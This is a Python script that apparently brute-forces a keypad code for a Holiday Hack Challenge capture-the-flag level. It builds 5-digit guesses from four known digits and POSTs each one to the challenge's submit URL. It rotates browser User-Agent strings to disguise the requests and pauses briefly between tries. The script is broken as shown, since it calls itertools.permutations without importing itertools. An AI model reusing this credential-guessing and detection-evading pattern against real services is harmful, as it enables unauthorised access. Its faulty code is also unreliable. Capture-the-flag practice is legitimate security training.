import requests
import time
import random
from itertools import cycle

# Digits to be used in generating 5-digit combinations
digits = ['2', '6', '7', '8']

# Generate all possible 5-digit numbers with at least one repeat of the digits 2, 6, 7, 8
combinations = set()
for comb in itertools.permutations(digits, 4):
    for digit in digits:
        # Insert the repeated digit at all possible positions to make a 5-digit number
        for i in range(5):
            number = list(comb)
            number.insert(i, digit)
            combinations.add("".join(number))

url = "https://hhc24-frostykeypad.holidayhackchallenge.com/submit?id=6dc032c6-8b15-4bdf-a320-83e1e267bb76"

# List of user agents to randomize
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko"
]

user_agent_cycle = cycle(user_agents)

# Iterate over each combination and send POST request
for answer in combinations:
    # Randomize User-Agent header
    headers = {
        "Content-Type": "application/json",
        "User-Agent": next(user_agent_cycle)
    }

    payload = {"answer": answer}
    response = requests.post(url, json=payload, headers=headers)

    # Scrolling effect
    print(f"Testing number: {answer} | Last response: {response.status_code} - {response.text}", end="\r")

    # Check if the response status code is not 400
    if response.status_code != 400:
        print(f"\nSuccessful number: {answer}")
        print(f"Response: {response.text}")
        break

    # Short delay between requests
    time.sleep(0.2)  # 200ms delay

print("\nScript finished.")
